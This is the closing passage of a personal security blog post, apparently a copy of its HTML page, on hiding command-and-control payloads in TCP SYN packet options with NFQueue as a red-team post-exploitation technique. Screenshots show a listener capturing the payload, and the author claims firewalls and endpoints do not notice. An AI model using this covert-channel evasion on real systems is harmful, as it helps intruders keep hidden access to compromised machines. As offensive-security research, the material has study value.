+<h4 id="Listener-packet-interception"><a href="#Listener-packet-interception" class="headerlink" title="Listener packet interception"></a>Listener packet interception</h4><p><img src="https://lh3.googleusercontent.com/xXTQxID1VH3XFicvSa-ACl2QBVrpmqk0DsbjV6Gt2N8zJn6QNJE6_yAXc4m83esF_CXXSIBxKcdYAH92cA9-pYz1o7hz2m_jhkwa27FxgXWeCAa3My_qtfDblZAtmxKvU77umg438MglU4NYNcYt37Q2qKm78rGJ5d8H-DlQMySJ6Cun3rF1Zso6zAi_dUVMJjJY1XndUlsr6bSuHGLftDycXaWc8D9gVabT_9OOtoqXtV9k7JhQf3_4puaFytbSey9xQVZ6BZqD_dMLA6-4ACgLWpQYnUudgJCSOsMraSNGgUy5nLvUaE1g7cOCP4C4NacDgz8z3wdxpolUoSzKM7NBQ6buMIST68kMOmWnBiAWAZPvK73AQ_8ed723WX7KzgqAg4CAXa4VHwJNciTCHvV0YpEs8oU2QlhKQBxGJ0Mte-UJdaQkfw8zi8KZMPwcDTRhVE5FFUI7Uf0ORboJ2SsTOlDZSODtylodVUVKXJR9rQII5zrN_6EVN8fxnBLK9hcAVX_Qku5V0xa3F0qhbVu9KgthFRNIF-yLMjWGx3fVlbXsf-wnNlqhOP5q4m7ToKiiHTlpFb0jCjgjttuI2PhNorzZ1zATNT8HCifadSXIcYMUy4UzHnyKDcKhgeb99SjMkGQX8cPPqjgPXV8L7iuVzwqhOGOMwYzLTlu77ISdqYr5e6B1g65rfEcf8SxJGFJ_rjIj2dn_ueXLac1bQBUEsfIze5udk1_GKQs7Xcv2U1s=w1467-h491-no"></p>
+<p>Cool! We intercepted the SYN packet coming in, and received the payload. Let’s make sure we could write it to a file (you can do anything you want with the payload once you have it).</p>
+<hr>
+<h3 id="Listener-file-contents"><a href="#Listener-file-contents" class="headerlink" title="Listener file contents"></a>Listener file contents</h3><p><img src="https://lh3.googleusercontent.com/AxXaAgOUrYIstv7jUcQuTn3giCdNYkRrccn2VsMCnEyRcqBvwpM4W3Hs0AARRUY3ruEgUifa2X6VNS2FEBodTSy59kmORZePxQVbPTQusIyXj1c7Bp5nawmu6YvuCjzwJ58_AGAcw7wErbdzTK-OmIqg0gtvNmLtTrC5i3qZg7fCCWx7rQETQ4Ykh2DO6kqHBk_AaB2M3u4tIDQfhwK0rrIwxkqSVnbKac6EDNgthjzqzDhdOVLsHLRjwCDVyoGS9_1kggBlcwum6bbbKxTcSOSToQdN8hntvZxdA9sNiF6eNDkaThCrHivoLkeh91Exp8-audEhrwARwduk6lhxDHUHANngk3srCPZpN64g_fImLQ7s7g2UTrdiyzE4JYcx39iWRDoWEXV7Oo3KeYWcCUxOcvhxtkhqHlYAgbPiyN-VW8wqEbxenRaWID8DjDbrWQ2mRpv292kpU3UD8JCr3IhOGV9_rmTKkJSh139Xs6hQFKelhAGfkyEfiZXmMmRfqL2l7pej2nMFu54q3Rvoc5z5CQYthEpolKZ5cQk7vkZe55i81x5S9fpavhtQm3ANBqE1Q7BvXqdV8l9b146BE8dVjY2MSeaWW0WFE9boLF7FFJmOHvujaPWRa-lqz4blM6yfnYg84OnJVH0PyAVZrPcr-HPz8RAHLfjXxN45HuU__XTwPs64H5RWdLgK78_FYwGiuE7W1UFUWs78dUfTHEfhsNQSxsw-W1cb6GoKHRyhgu0=w1280-h140-no"></p>
+<p>And there you go. Payload was intercepted, packet was truncated (although I couldn’t find a screenshot to prove that, you can see for yourself if you run it), and noone is the wiser. The firewall doesn’t have the resources to read the options of every single SYN packet coming in, especially when it’s a large scale environment with lots of inbounds connections, and the endpoint is none the wiser.</p>
+<h1 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h1><p>This is just a Hello World example of what can be done with NFQueue from a red teaming perspective during post-exploitation. The easiest way to hide something in network traffic is to hide in numbers, and we have done just that. There isn’t anything more common than an incoming SYN packet to a server.</p>
+<p>However, this method does require root privileges on the victim system or <code>CAP_NET_ADMIN</code> capabilities for a compromised user. Additionally, the <code>libnetfilter_queue</code> dependency must be installed on the victim, meaning that for now this method will only work on systems with netfilter and the NFQueue extension installed (so far I could only find it working on Linux). It can also work on BSD systems using divert sockets but I have not tried that, although as per documentation there are similar limitations as to the Linux method. </p>
+<p>I plan to find a way to hide the payload better within TCP options by researching more into default lengths and commonly used option kinds. Additionally, I’m trying to construct an environment where the TCP packet is re-segmented and possibly truncated if the handshake packet is more than 60 bytes. </p>
+<h2 id="Future-learning"><a href="#Future-learning" class="headerlink" title="Future learning"></a>Future learning</h2><p>This is my first time making a blog post. Please contact me at <a href="mailto:&#x74;&#x68;&#101;&#115;&#119;&#x34;&#x72;&#109;&#x40;&#112;&#x6d;&#46;&#x6d;&#x65;">&#x74;&#x68;&#101;&#115;&#119;&#x34;&#x72;&#109;&#x40;&#112;&#x6d;&#46;&#x6d;&#x65;</a> if you want to discuss anything tech based with me. Definitely please let me know of anything that can be improved, if this method is actually applicable in a real engagement, or anyway I can improve it so it becomes that way. Peace guys!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/thesw4rm">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Intro-Disclaimer"><span class="toc-number">1.</span> <span class="toc-text">Quick Intro&#x2F;Disclaimer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Background"><span class="toc-number">2.</span> <span class="toc-text">Background</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Initial-Info"><span class="toc-number"></span> <span class="toc-text">Initial Info</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IPV4-packets-are-structured-as-shown-in-this-image"><span class="toc-number">0.0.1.</span> <span class="toc-text">IPV4 packets are structured as shown in this image</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCP-packets-are-structured-as-shown-in-this-image"><span class="toc-number">0.0.2.</span> <span class="toc-text">TCP packets are structured as shown in this image.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFQueue"><span class="toc-number">1.</span> <span class="toc-text">NFQueue</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Building-the-test-environment"><span class="toc-number"></span> <span class="toc-text">Building the test environment</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Writing-the-code"><span class="toc-number"></span> <span class="toc-text">Writing the code</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Some-stupid-college-kid-boiled-some-plates"><span class="toc-number">1.</span> <span class="toc-text">Some stupid college kid boiled some plates</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breaking-down-the-boilerplate"><span class="toc-number">2.</span> <span class="toc-text">Breaking down the boilerplate</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tcp-pkt-struct-h"><span class="toc-number">2.0.1.</span> <span class="toc-text">tcp_pkt_struct.h</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#main-c"><span class="toc-number">2.0.2.</span> <span class="toc-text">main.c</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Plan-of-attack"><span class="toc-number">3.</span> <span class="toc-text">Plan of attack</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Curl-the-server-from-the-controller"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">Curl the server from the controller</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Let%E2%80%99s-look-at-what-wireshark-shows-filtered-for-just-SYN-packets"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">Let’s look at what wireshark shows (filtered for just SYN packets)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Analysis"><span class="toc-number">3.0.1.</span> <span class="toc-text">Analysis</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Storm-of-Code-Controller"><span class="toc-number">4.</span> <span class="toc-text">The Storm of Code - Controller</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tcp-pkt-struct-h-1"><span class="toc-number">4.0.1.</span> <span class="toc-text">tcp_pkt_struct.h</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#main-c-1"><span class="toc-number">4.0.2.</span> <span class="toc-text">main.c</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fruit-of-labour"><span class="toc-number">4.1.</span> <span class="toc-text">Fruit of labour</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Controller-Screenshot"><span class="toc-number">4.1.1.</span> <span class="toc-text">Controller Screenshot</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Controller-Wireshark"><span class="toc-number">4.1.2.</span> <span class="toc-text">Controller Wireshark</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Storm-of-Code-listener"><span class="toc-number">5.</span> <span class="toc-text">The Storm of Code- listener</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main-c-2"><span class="toc-number">5.1.</span> <span class="toc-text">main.c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Proving-it-worked"><span class="toc-number">5.2.</span> <span class="toc-text">Proving it worked</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Listener-packet-interception"><span class="toc-number">5.2.1.</span> <span class="toc-text">Listener packet interception</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Listener-file-contents"><span class="toc-number">5.3.</span> <span class="toc-text">Listener file contents</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusions"><span class="toc-number"></span> <span class="toc-text">Conclusions</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Future-learning"><span class="toc-number">1.</span> <span class="toc-text">Future learning</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&text=Command and Control via TCP Handshake"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&title=Command and Control via TCP Handshake"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&is_video=false&description=Command and Control via TCP Handshake"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Command and Control via TCP Handshake&body=Check out this article: http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&title=Command and Control via TCP Handshake"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&title=Command and Control via TCP Handshake"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&title=Command and Control via TCP Handshake"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&title=Command and Control via TCP Handshake"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://thesw4rm.com/2019/09/15/Command-and-Control-via-TCP-Handshake/&name=Command and Control via TCP Handshake&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 sw4rm
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/thesw4rm">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
